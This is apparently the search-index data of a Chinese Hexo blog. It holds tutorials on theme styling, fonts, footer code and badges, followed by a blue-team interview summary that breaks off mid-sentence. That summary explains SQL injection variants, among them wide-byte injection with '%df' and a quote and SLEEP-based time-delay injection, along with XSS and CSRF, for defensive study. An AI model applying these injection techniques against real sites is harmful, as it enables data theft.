4405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503#drone .container .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .trigger .monitor .opening .camera.o-x .camera.o-y .camera.o-z .awing .stars .star .star .star .star .star .star .star .star .star .star .star .star .star .star .star .star .star .star .star .star .star .star .star .star .star .star .star .star .star .star .star .star .star .star .star .star .star .star .star .star .fly.o-x .fly.o-y .fly.o-z .free_bounce .free_rotate .body .cockpit .under .back .left .right .edge_left .edge_right .boosts .boost .boost .boost .boost .boost .boost .boost .boost .boost .boost .boost .boost .boost .boost .boost .boost .boost .boost .boost .boost .boost .boost .boost .boost .boost .boost .boost .boost .boost .boost .wing_left .under .back .left .right .wing_right .under .back .left .right 在BlogRoot/themes/butterfly/layout/includes/header/index.pug中引入上一步中创建的plane.pug文件。 跟#site-info、#scroll-down同级，具体位置如下图： 1!=partial(&#x27;includes/header/plane&#x27;, &#123;&#125;, &#123;cache: true&#125;) 在主题配置文件_config.butterfly.yml中引入plane.css。 123inject: head: - &lt;link rel=&quot;stylesheet&quot; href=&quot;https://npm.elemecdn.com/ethan4116-blog/lib/css/plane_v2.css&quot;&gt; 最后重新编译运行即可看见效果。 BUG 反馈关于下方有横向滚动条的 bug , 如下图所示 为了及时解决这个 bug , 在自定义的 css 中加入下面这个样式即可。 123#drone .container &#123; overflow: hidden;&#125; 重新编译运行即可看见效果。","tags":"博客美化"},{"title":"全局修改博客字体","url":"/post/c174d6ac.html","text":"前言参考自：Butterfly 如何优雅的改字体 效果预览 实现步骤下载字体推荐网站：字体天下 下载字体并解压得到ttf文件 引入字体新建fonts文件夹：Blog根目录\\themes\\butterfly\\source\\fonts，将ttf文件移到该文件夹 打开Blog根目录\\source\\css\\custom.css，缺少的文件或文件夹直接新建即可，写入下列代码 注：font-family支持自定义名称；不要忘记修改src! 123456/* 字体样式 */@font-face &#123; font-family: &#x27;ziti&#x27;; font-display: swap; src: url(&#x27;/fonts/MaoKenZhuYuanTi-MaokenZhuyuanTi-2.ttf&#x27;) format(&quot;truetype&quot;);&#125; 打开主题配置文件_config.butterfly.yml，搜索font-family，定位到下列位置并将上面代码中的font-family的名称写入 注：Microsoft YaHei是为了防止字体加载不出来导致没有文本的备用字体 1234567# Global font settings# Don&#x27;t modify the following settings unless you know how they work (非必要不要修改)font: global-font-size: code-font-size: font-family: ziti,&quot;Microsoft YaHei&quot; code-font-family:","tags":"博客美化"},{"title":"页脚美化","url":"/post/63a1f478.html","text":"前言转载自：Fomalhaut同款页脚 效果预览 注：框出来的徽标可以自行制作，参考页脚徽标制作 实现步骤 将[BlogRoot]/themes/butterfly/layout/includes/footer.pug替换成如下代码这块东西分为几个部分，一个是以#ft为块的DOM，其中分为了格言、猜你想看、推荐友链三部分，参考图中的位置结合自己的喜好进行修改即可，图像、文字和链接均替换成你自己的（记住不要用我的链接！！！）；if theme.footer.owner.enable起这一块是主题指定的信息版权信息，我把主题配置项的copyright和custom_text这两项留空了，因此只会显示©2022 By Fomalhaut🥝；再然后就是#workboard这块，这块的信息由js逻辑写入与更新，可以自定义；最后是p#ghbdages这块，是徽标显示，大家可以到shields.io按照自己的信息生成（不要用我的！！！）: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778#footer-wrap #ft .ft-item-1 .t-top .t-t-l p.ft-t.t-l-t Motto🧬 .bg-ad div | A contented mind is a perpetual feast. 知足常乐🍰 .btn-xz-box a.btn-xz(href=&#x27;https://www.dqywy.top/about/&#x27;) 关于博主 .t-t-r p.ft-t.t-l-t 猜你想看💡 ul.ft-links li a(href=&#x27;/posts/eec9786.html&#x27;) 🐳魔改指南 a(href=&#x27;/box/nav/&#x27;) 👻待做清单 li a(href=&#x27;/personal/about/&#x27;) 🪜文章分类 a(href=&#x27;/archives/&#x27;) 🧭文章标签 li a(href=&#x27;/categories/&#x27;) 🔍时间轴 a(href=&#x27;/tags/&#x27;) ⭐Github .ft-item-2 p.ft-t 推荐友链⌛ .ft-img-group .img-group-item a(href=&#x27;http://47.109.96.67:4000/&#x27; title=&#x27;攀墙の博客&#x27;) img(src=&#x27;https://s1.ax1x.com/2023/05/07/p9wAPit.jpg&#x27; alt=&#x27;图片出问题啦~&#x27;) if theme.footer.owner.enable - var now = new Date() - var nowYear = now.getFullYear() if theme.footer.owner.since &amp;&amp; theme.footer.owner.since != nowYear .copyright span!= `&lt;b&gt;&amp;copy;$&#123;theme.footer.owner.since&#125; - $&#123;nowYear&#125;&lt;/b&gt;` span!= `&lt;b&gt;&amp;nbsp;&amp;nbsp;By $&#123;config.author&#125;&lt;/b&gt;` else .copyright span!= `&lt;b&gt;&amp;copy;$&#123;nowYear&#125;&lt;/b&gt;` span!= `&lt;b&gt;&amp;nbsp;&amp;nbsp;By $&#123;config.author&#125;&lt;/b&gt;` if theme.footer.copyright .framework-info span= _p(&#x27;footer.framework&#x27;) + &#x27; &#x27; a(href=&#x27;https://hexo.io&#x27;)= &#x27;Hexo&#x27; span.footer-separator | span= _p(&#x27;footer.theme&#x27;) + &#x27; &#x27; a(href=&#x27;https://github.com/jerryc127/hexo-theme-butterfly&#x27;)= &#x27;Butterfly&#x27; if theme.footer.custom_text .footer_custom_text!=`$&#123;theme.footer.custom_text&#125;` #workboard p#ghbdages a.github-badge(target=&#x27;_blank&#x27; href=&quot;https://hexo.io/&quot; style=&#x27;margin-inline:5px&#x27; title=&quot;博客框架为Hexo_v6.3.0&quot;) img(src=&quot;https://img.shields.io/badge/Frame-Hexo-blue?logo=Hexo&amp;style=plastic&quot; alt=&#x27;&#x27;) a.github-badge(target=&#x27;_blank&#x27; href=&quot;https://butterfly.js.org/&quot; style=&#x27;margin-inline:5px&#x27; title=&quot;主题版本Butterfly_v3.8.1&quot;) img(src=&quot;https://sourcebucket.s3.ladydaily.com/badge/Theme-Butterfly-6513df.svg&quot; alt=&#x27;&#x27;) a.github-badge(target=&#x27;_blank&#x27; href=&quot;https://vercel.com/&quot; style=&#x27;margin-inline:5px&#x27; title=&quot;本站采用多线部署，主线路托管于Vercel&quot;) img(src=&quot;https://sourcebucket.s3.ladydaily.com/badge/Hosted-Vercel-brightgreen.svg&quot; alt=&#x27;&#x27;) a.github-badge(target=&#x27;_blank&#x27; href=&quot;https://github.com/hellodqy/hellodqy.github.io&quot; style=&#x27;margin-inline:5px&#x27; title=&quot;本网站源码由Github提供存储仓库&quot;) img(src=&quot; https://sourcebucket.s3.ladydaily.com/badge/Source-Github-d021d6.svg&quot; alt=&#x27;&#x27;) a.github-badge(target=&#x27;_blank&#x27; href=&quot;https://www.algolia.com/&quot; style=&#x27;margin-inline:5px&#x27; title=&quot;本网站搜索引擎由Algolia提供&quot;) img(src=&quot;https://img.shields.io/badge/Search-Algolia-9cf?logo=algolia&amp;style=plastic&quot; alt=&#x27;&#x27;) a.github-badge(target=&#x27;_blank&#x27; href=&quot;https://account.mongodb.com/&quot; style=&#x27;margin-inline:5px&#x27; title=&quot;本网站数据库由MongoDB提供&quot;) img(src=&quot;https://img.shields.io/badge/DataBase-MongoDB-orange?logo=MongoDB&amp;style=plastic&quot; alt=&#x27;&#x27;) a.github-badge(target=&#x27;_blank&#x27; href=&quot;https://bz.zzzmh.cn/index&quot; style=&#x27;margin-inline:5px&#x27; title=&quot;本网站壁纸封面由极简壁纸提供&quot;) img(src=&quot;https://img.shields.io/badge/Wallpaper-Minimalism-ff69b4?logo=Hexo&amp;style=plastic&quot; alt=&#x27;&#x27;) a.github-badge(target=&#x27;_blank&#x27; href=&quot;https://smms.app/&quot; style=&#x27;margin-inline:5px&#x27; title=&quot;本网站图床由SMMS提供&quot;) img(src=&quot;https://img.shields.io/badge/Photos-SMMS-red?logo=smashingmagazine&amp;style=plastic&quot; alt=&#x27;&#x27;) 将以下代码复制到自定义的custom.css中，其中颜色、圆角等可以根据你自己的喜好进行修改: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247/* tzy页脚样式 */#ft &#123; max-width: 1200px; margin: 0 auto 12px; display: flex; color: auto; text-align: left; flex-wrap: wrap;&#125;.ft-item-1,.ft-item-2 &#123; display: flex; height: 100%; padding: 2px 14px;&#125;.ft-item-1 &#123; flex-direction: column; flex: 2;&#125;.ft-item-2 &#123; flex: 1; flex-direction: column;&#125;.t-top &#123; display: flex;&#125;.t-top .t-t-l &#123; display: flex; flex-direction: column; flex: 1.4; margin-right: 10px;&#125;.t-top .t-t-l .bg-ad &#123; width: 85%; border-radius: 10px; padding: 0 10px;&#125;.btn-xz-box &#123; margin-top: 10px;&#125;/* 按钮背景颜色等 */.btn-xz &#123; display: block; background-color: var(--btn-bg); color: var(--btn-color); text-align: center; line-height: 2.4; margin: 8px 0;&#125;.btn-xz:hover &#123; text-decoration: none !important;&#125;/* 按钮悬浮颜色 */.btn-xz-box:hover .btn-xz &#123; background-color: var(--text-bg-hover);&#125;.t-top .t-t-r &#123; display: flex; flex-direction: column; flex: 1;&#125;.ft-links &#123; padding: 0 14px; list-style: none; margin-top: 0 !important;&#125;.ft-links li a &#123; display: inline-block !important; width: 50%;&#125;/* 链接悬浮颜色 */.ft-links li a:hover &#123; text-decoration: none !important; color: var(--theme-color) !important;&#125;.ft-item-2 .ft-img-group &#123; width: 100%;&#125;.ft-t &#123; font-size: 1.1rem; margin-bottom: 20px; line-height: 1; font-weight: 600;&#125;.t-l-t &#123; padding-left: 14px;&#125;.ft-item-2 .ft-img-group .img-group-item &#123; display: inline-block; width: 18.4%; margin-right: 14px; margin-bottom: 6px;&#125;.ft-item-2 .ft-img-group .img-group-item a &#123; display: inline-block; width: 100%; height: 100%;&#125;.ft-item-2 .ft-img-group .img-group-item a img &#123; width: 100%; max-height: 80px; border-radius: 10px;&#125;/* 头像悬浮颜色框 */.ft-item-2 .ft-img-group .img-group-item a img:hover &#123; border: 2px solid var(--theme-color);&#125;@media screen and (max-width: 768px) &#123; .ft-item-1 &#123; flex-basis: 100% !important; &#125; .ft-item-2 &#123; flex-basis: 100% !important; &#125; .t-top .t-t-l .bg-ad &#123; width: 100%; &#125;&#125;@media screen and (max-width: 576px) &#123; .t-top &#123; flex-wrap: wrap; &#125; .t-top .t-t-l &#123; flex-basis: 100% !important; &#125; .t-top .t-t-r &#123; margin-top: 16px; flex-basis: 100% !important; &#125;&#125;#footer-wrap a &#123; border-radius: 30px;&#125;#footer-wrap &#123; padding: 20px 20px;&#125;/* 页脚心跳动画 */#heartbeat &#123; color: red; animation: iconAnimate 1s ease-in-out infinite;&#125;@-moz-keyframes iconAnimate &#123; 0%, 100% &#123; transform: scale(1); &#125; 10%, 30% &#123; transform: scale(0.9); &#125; 20%, 40%, 60%, 80% &#123; transform: scale(1.1); &#125; 50%, 70% &#123; transform: scale(1.1); &#125;&#125;@-webkit-keyframes iconAnimate &#123; 0%, 100% &#123; transform: scale(1); &#125; 10%, 30% &#123; transform: scale(0.9); &#125; 20%, 40%, 60%, 80% &#123; transform: scale(1.1); &#125; 50%, 70% &#123; transform: scale(1.1); &#125;&#125;@-o-keyframes iconAnimate &#123; 0%, 100% &#123; transform: scale(1); &#125; 10%, 30% &#123; transform: scale(0.9); &#125; 20%, 40%, 60%, 80% &#123; transform: scale(1.1); &#125; 50%, 70% &#123; transform: scale(1.1); &#125;&#125;@keyframes iconAnimate &#123; 0%, 100% &#123; transform: scale(1); &#125; 10%, 30% &#123; transform: scale(0.9); &#125; 20%, 40%, 60%, 80% &#123; transform: scale(1.1); &#125; 50%, 70% &#123; transform: scale(1.1); &#125;&#125; 然后计时器还要往#footer-wrap这块元素上面写入网站运行时间等信息，新建文件[BlogRoot]\\source\\js\\runtime.js，写入如下代码。这里要修改的几块东西是：网站诞生时间、currentTimeHtml这块东西；其中currentTimeHtml分为了两种模式，对应两个不同的图标，自行研究一下就懂！ 12345678910111213141516171819202122232425262728293031var now = new Date();function createtime() &#123; // 当前时间 now.setTime(now.getTime() + 1000); var start = new Date(&quot;08/01/2022 00:00:00&quot;); // 旅行者1号开始计算的时间 var dis = Math.trunc(23400000000 + ((now - start) / 1000) * 17); // 距离=秒数*速度 记住转换毫秒 var unit = (dis / 149600000).toFixed(6); // 天文单位 var grt = new Date(&quot;04/22/2023 00:00:00&quot;); // 网站诞生时间 月/日/年 时:分:秒 var days = (now - grt) / 1e3 / 60 / 60 / 24, dnum = Math.floor(days), hours = (now - grt) / 1e3 / 60 / 60 - 24 * dnum, hnum = Math.floor(hours); 1 == String(hnum).length &amp;&amp; (hnum = &quot;0&quot; + hnum); var minutes = (now - grt) / 1e3 / 60 - 1440 * dnum - 60 * hnum, mnum = Math.floor(minutes); 1 == String(mnum).length &amp;&amp; (mnum = &quot;0&quot; + mnum); var seconds = (now - grt) / 1e3 - 86400 * dnum - 3600 * hnum - 60 * mnum, snum = Math.round(seconds); 1 == String(snum).length &amp;&amp; (snum = &quot;0&quot; + snum); let currentTimeHtml = &quot;&quot;; (currentTimeHtml = hnum &lt; 18 &amp;&amp; hnum &gt;= 9 ? `&lt;img class=&#x27;boardsign&#x27; src=&#x27;https://img.shields.io/badge/DQY&amp;WY%E3%81%AE%E5%B0%8F%E7%AA%9D-%E7%A3%95%E7%9D%A1%E7%9D%80%E5%91%A2-ff69b4?logo=westerndigital&amp;style=plastic&#x27; title=&#x27;没事就多陪陪女朋友~&#x27;&gt;&lt;br&gt; &lt;div style=&quot;font-size:13px;font-weight:bold&quot;&gt;本站居然运行了 $&#123;dnum&#125; 天 $&#123;hnum&#125; 小时 $&#123;mnum&#125; 分 $&#123;snum&#125; 秒 &lt;i id=&quot;heartbeat&quot; class=&#x27;fas fa-heartbeat&#x27;&gt;&lt;/i&gt; &lt;br&gt; 旅行者 1 号当前距离地球 $&#123;dis&#125; 千米，约为 $&#123;unit&#125; 个天文单位 🚀&lt;/div&gt;` : `&lt;img class=&#x27;boardsign&#x27; src=&#x27;https://img.shields.io/badge/DQY&amp;WY%E3%81%AE%E5%B0%8F%E7%AA%9D-%E7%A3%95%E7%9D%A1%E7%9D%80%E5%91%A2-ff69b4?logo=westerndigital&amp;style=plastic&#x27; title=&#x27;没事儿就多陪陪女朋友~&#x27;&gt;&lt;br&gt; &lt;div style=&quot;font-size:13px;font-weight:bold&quot;&gt;本站居然运行了 $&#123;dnum&#125; 天 $&#123;hnum&#125; 小时 $&#123;mnum&#125; 分 $&#123;snum&#125; 秒 &lt;i id=&quot;heartbeat&quot; class=&#x27;fas fa-heartbeat&#x27;&gt;&lt;/i&gt; &lt;br&gt; 旅行者 1 号当前距离地球 $&#123;dis&#125; 千米，约为 $&#123;unit&#125; 个天文单位 🚀&lt;/div&gt;`), document.getElementById(&quot;workboard&quot;) &amp;&amp; (document.getElementById(&quot;workboard&quot;).innerHTML = currentTimeHtml);&#125;// 设置重复执行函数，周期1000mssetInterval(() =&gt; &#123; createtime();&#125;, 1000); 在主题配置文件_config.butterfly.yml引入该runtime.js文件： 123inject: bottom: + - &lt;script defer src=&quot;/js/runtime.js&quot;&gt;&lt;/script&gt; # 页脚计时器 hexo三连","tags":"博客美化"},{"title":"页脚徽标制作","url":"/post/947cbf4b.html","text":"实现网站徽标在线制作网站(已经和下面的图片不一样了，但是不用网站也可以实现徽标制作) 原版界面 制作方式复制下列url到浏览器 1https://img.shields.io/badge/Frame-Hexo-blue?logo=Hexo&amp;style=plastic 你应该会看到这样的徽标： 在url进行修改： 改图标(对应图片里面最左边的H)：图标查询，图标名称直接使用simpleicons网站中的名称，填在logo=后面 改内容： Frame-&gt;徽标左侧内容，即Frame Hexo-&gt;徽标右侧内容，即Hexo 改颜色：将blue改为原版界面图片中的任意颜色名字即可 得到满意的效果后将url填入img的src中即可 1img(src=&quot;https://img.shields.io/badge/Frame-Hexo-blue?logo=Hexo&amp;style=plastic&quot; alt=&#x27;&#x27;)","tags":"博客美化"},{"title":"阿里图标引入","url":"/post/5a7175cd.html","text":"前言转载自：AkilarのIconfont Inject 效果预览 步骤新建图标项目 访问阿里巴巴矢量图标库,注册登录。 搜索自己心仪的图标，然后选择添加入库，加到购物车。 选择完毕后点击右上角的购物车图标，打开侧栏，选择添加到项目，如果没有项目就新建一个。 可以通过上方顶栏菜单-&gt;资源管理-&gt;我的项目，找到之前添加的图标项目。 引入图标 找到之前新建的图标项目，选择下载至本地，将图标库内容下载下来，然后解压得到下图文件： 将eot、svg、ttf、woff、woff2后缀的五个文件移至[Blogroot]\\themes\\butterfly\\source\\fonts\\目录下，没有fonts新建即可 在[Blogroot]\\themes\\butterfly\\source\\css\\custom.css中填写如下内容： 123456789@font-face &#123;font-family: &#x27;iconfont&#x27;;src: url(&#x27;/fonts/iconfont.eot&#x27;);src: url(&#x27;/fonts/iconfont.eot?#iefix&#x27;) format(&#x27;embedded-opentype&#x27;),url(&#x27;/fonts/iconfont.woff2&#x27;) format(&#x27;woff2&#x27;),url(&#x27;/fonts/iconfont.woff&#x27;) format(&#x27;woff&#x27;),url(&#x27;/fonts/iconfont.ttf&#x27;) format(&#x27;truetype&#x27;),url(&#x27;/fonts/iconfont.svg#iconfont&#x27;) format(&#x27;svg&#x27;);&#125; 打开iconfont.css，复制其中形似如下的代码到[Blogroot]\\themes\\butterfly\\source\\css\\custom.css中： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859.iconfont &#123;font-family: &quot;iconfont&quot; !important;/* font-family 可以自定义，但是必须和上面@font-face中的font-family保持一致 */font-size: 3em;/* 可以定义图标大小 */font-style: normal;-webkit-font-smoothing: antialiased;-moz-osx-font-smoothing: grayscale;&#125;.icon-rat:before &#123; content: &quot;\\e60e&quot;; color: #85c3de; /* 可以使用color属性来定义图标颜色 */ /* 若已经在项目设置中勾选了彩色选项，则无需再定义图标颜色*/&#125;.icon-ox:before &#123; content: &quot;\\e60c&quot;; color: #ffaf6e;&#125;.icon-tiger:before &#123; content: &quot;\\e611&quot;; color: #f7c768;&#125;.icon-rabbit:before &#123; content: &quot;\\e60d&quot;; color: #ffbdd8;&#125;.icon-dragon:before &#123; content: &quot;\\e609&quot;; color: #ff8787;&#125;.icon-snake:before &#123; content: &quot;\\e610&quot;; color: #c3d686;&#125;.icon-horse:before &#123; content: &quot;\\e60a&quot;; color: #ffaf6e;&#125;.icon-goat:before &#123; content: &quot;\\e608&quot;; color: #f7c768;&#125;.icon-monkey:before &#123; content: &quot;\\e60b&quot;; color: #c3d686;&#125;.icon-rooster:before &#123; content: &quot;\\e60f&quot;; color: #ff8787;&#125;.icon-dog:before &#123; content: &quot;\\e607&quot;; color: #85c3de;&#125;.icon-boar:before &#123; content: &quot;\\e612&quot;; color: #ffbdd8;&#125; 使用图标打开主题配置文件_config_butterfly.yml 使用格式：font-family名字(没有修改过一般都是iconfont) icon名称","tags":"博客美化"},{"title":"蓝初面试总结","url":"/post/f41becb6.html","text":"前言这几天和朋友聊天并看了一些蓝初面经，我将面试重点分为应急响应、常见漏洞、流量特征、端口与杂项几个方面 应急响应1. DDOS与CC攻击 快速检测并确认攻击类型和攻击源； 提高带宽和资源利用率，以提供更强的承载能力； 实施流量清洗、流量限制和IP封堵等措施，清除恶意攻击流量； 配合 ISP 进行攻击源 IP 的追踪和协助； 在攻击持续期间，保持实时监控和跟进，随时更新应急响应策略。 2. 动态链接库DLL劫持概述：攻击者通过将恶意 DLL 文件替换为合法的 DLL 文件，从而实现向操作系统注入恶意代码的目的 立即隔离受影响的系统，并从网络中断开，以避免进一步的攻击和传播。 恢复被劫持的 DLL 文件，将其从系统中删除，并替换为原始的、正确的 DLL 文件。如果原始的 DLL 文件已经被篡改或删除，需要重新安装相应的软件或应用程序来获取正确的 DLL 文件。 检查被劫持的 DLL 文件是否包含恶意代码，以及其他可能被感染的文件和系统组件。使用杀毒软件和反恶意软件等工具来清除恶意代码。 修改注册表，防止恶意 DLL 文件再次被加载。例如，修改HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\KnownDLLs 键值，将所有可信 DLL 文件添加到其中。 加强安全措施，例如，禁用不必要的服务和进程、添加访问控制列表、加密重要数据等。 3. 排查思路（基本流程） 确认事件：首先需要了解事件的具体情况，包括发生的时间、影响范围、受影响的系统和服务等信息。同时还需要判断是否存在钓鱼邮件、病毒感染等情况。 收集证据：在确认安全事件后，需要及时收集相关证据，包括日志记录、网络流量、进程信息、文件系统状态等信息，并进行存档备份，为后续的分析提供依据。 分析数据：对收集到的证据进行分析，尤其是日志和网络流量等数据，可以帮助快速定位问题和确认是否存在攻击行为。在分析过程中，可以利用一些常见的工具，例如 Wireshark、Nmap、Sysinternals 等。 阻止攻击：在确认存在攻击行为后，需要立即采取措施，阻止攻击并保护现有系统。这些措施包括封锁网络、隔离受感染主机、关闭漏洞等。 制定应急计划：包括恢复数据、修复漏洞、加强安全防御等方面。 漏洞1. SQL注入（1）宽字节注入 原理： 目标站点对于特殊字符的转义（单双引号）前面会添加斜杠/，斜杠/ url 编码是 %5c，如果目标站点使用的是 gbk 编码，则可以构造 payload %df 加 单引号，%df 与%5c 进行结合成为一个汉字，而单引号则逃逸了出去。 （2）常规 种类： 基于错误的注入：该类型的 SQL 注入利用应用程序返回的错误信息来进行攻击，例如通过构造带有语法错误的查询来触发错误信息，攻击者可以从错误消息中获得关于数据库架构和数据的重要信息。 盲注注入：在盲注注入中，攻击者无法直接获取数据库返回的信息，因此需要通过其他方式来推断相关数据。例如，攻击者可以利用时间延迟等机制来判断是否成功注入恶意的SQL语句。 基于联合查询的注入：攻击者可以利用 UNION SELECT 语句将两个或多个结果集组合在一起，以获取额外的信息或绕过认证检查。攻击者通常会尝试通过添加 UNION SELECT 语句来向查询中添加恶意代码，例如向查询结果集中添加用户列表或密码信息。 基于布尔逻辑的注入：在这种类型的 SQL 注入中，攻击者会构造一个查询，该查询会返回一个布尔值。攻击者可以利用这些查询来推断数据库中的数据，例如使用 WHERE 子句构造一个布尔查询来检查某个字段是否存在。 时间延迟注入：在时间延迟注入中，攻击者通过向查询中添加时间延迟语句来判断查询是否成功执行。例如，攻击者可以使用 SLEEP() 函数来强制查询等待一段时间，在等待期间观察程序的响应时间来确定注入点是否存在。 检测： 查看数据库异常日志，如果发现异常 SQL 语句，或者 SQL 语句中包含可疑代码或关键字，就可能存在 SQL 注入攻击。 应用服务器日志：在应用服务器上查看访问日志或错误日志，如果发现访问异常、错误码增多，或者包含可疑的 URL 参数等信息，也可能表明存在 SQL 注入攻击。 使用专业的漏洞扫描工具。 安全审计：通过记录用户行为和操作日志，可以检测和追踪可能存在的 SQL 注入攻击。 手动测试：模拟攻击者的行为，手动输入特定的 SQL 语句或注入代码，来验证是否存在 SQL 注入漏洞。 原理：对用户输入的数据没有进行严格的过滤与判断，导致用户构造各种恶意 payload 拼接进后台数据库查询语句中执行。 原因：SQL注入可以分为平台层注入和代码层注入。前者由不安全的数据库配置或数据库平台的漏洞所致；后者主要是由于程序员对输入未进行细致地过滤，从而执行了非法的数据查询。基于此，SQL注入的产生原因通常表现在以下几方面：①不当的类型处理；②不安全的数据库配置；③不合理的查询集处理；④不当的错误处理；⑤转义字符处理不合适；⑥多个提交处理不当。 危害：数据库信息泄漏通过操作数据库对特定网页进行篡改。网站被挂马，传播恶意软件。数据库被恶意操作：数据库服务器被攻击，数据库的系统管理员帐户被窜改。服务器被远程控制，被安装后门。破坏硬盘数据，瘫痪全系统。 防御： 输入验证：对用户输入数据进行验证和过滤，特别是对单引号、双引号、分号等特殊字符进行处理。可以使用输入过滤函数或正则表达式等方式来实现。 参数化查询：使用参数化查询操作数据库，可以将用户输入的数据视为参数而不是 SQL 代码的一部分，从而避免 SQL 注入攻击。 最小化权限原则：在应用程序连接数据库时，给予最小必要的权限，并严格控制数据库访问权限，以减少攻击者利用 SQL 注入漏洞获取敏感信息的可能性。 安全编码标准：在开发应用程序时，遵循安全编码标准，避免使用拼接 SQL 语句的方式。 异常信息处理：在应用程序中添加异常处理机制，可以及时捕获和记录 SQL 注入攻击产生的异常信息，便于管理员及时发现和修复问题。 安全审计：通过记录用户行为和操作日志，可以检测和追踪可能存在的 SQL 注入攻击。 2. XSS（跨站脚本攻击）原理：它利用了应用程序没有正确过滤或转义用户输入的数据，导致恶意用户可以向网站上注入恶意脚本代码，使其他用户在浏览网站时受到攻击。XSS攻击通常发生在包含表单、搜索框和评论框等用户输入区域的Web页面上。攻击者会向这些输入框中插入包含恶意脚本代码的数据。例如，如果一个在线购物网站没有对用户在评论框中输入的HTML代码进行过滤，那么攻击者可以通过在评论框中注入恶意JavaScript代码来窃取其他用户的登录凭证或个人信息。 种类：存储型，反射型，DOM型 区别：存储型:常出现在信息修改添加等地方，导致恶意代码被存储在数据库中，每当被攻击者访问到后就会触发执行；反射型：常出现在url中，一般需要攻击者提前构造好恶意链接，欺骗用户点击，触发攻击代码；DOM型：攻击代码在url中，然后输出在了浏览器的DOM节点中。简单比较会发现，存储和反射都经过服务器，而DOM是纯前端。 危害：（1）网络钓鱼，盗取用户账号（2）窃取用户Cookie，获取用户隐私，或者利用用户身份进一步执行操作（3）劫持用户（浏览器）会话，从而执行任意操作，例如进行非法转账、强制发表日志等（4）强制弹出广告页面，刷流量等（5）进行恶意操作，例如任意篡改页面信息，删除文章等，传播跨站脚本蠕虫，网页挂马等（6）进行基于大量的客户端攻击，如DDOS攻击 防御：（1）代码里对用户输入的地方和变量都需要仔细检查长度和对单引号、分号等特殊符号做过滤；对输入数据进行Html Encode 处理，白名单过滤，过滤JavaScript 事件的标签，开启http-only（2）避免直接在cookie 中泄露用户隐私，例如email、密码等等。（3）通过使cookie和系统ip绑定来降低cookie泄露后的危险。这样攻击者得到的cookie 没有实际价值，不可能拿来重放。（4）尽量采用POST而非GET提交表单 3. CSRF（跨站点请求伪造）原理：用户未关闭与正规网站的会话就重新tab了一个新的页面并访问攻击者的虚假网站，导致自身cookie或其他个人信息被攻击者获取，攻击者可以使用携带用户cookie的浏览器访问其他网站，网站默认从浏览器中获取cookie，误认为是用户操作，导致操作者可以执行一些未经授权的行为3.防御（1） GET、POST的正确使用（2） 利用验证码（在一定的情况下使用，但是为了防止客户产生不好印象，尽量不用）（3） Anti CSRF 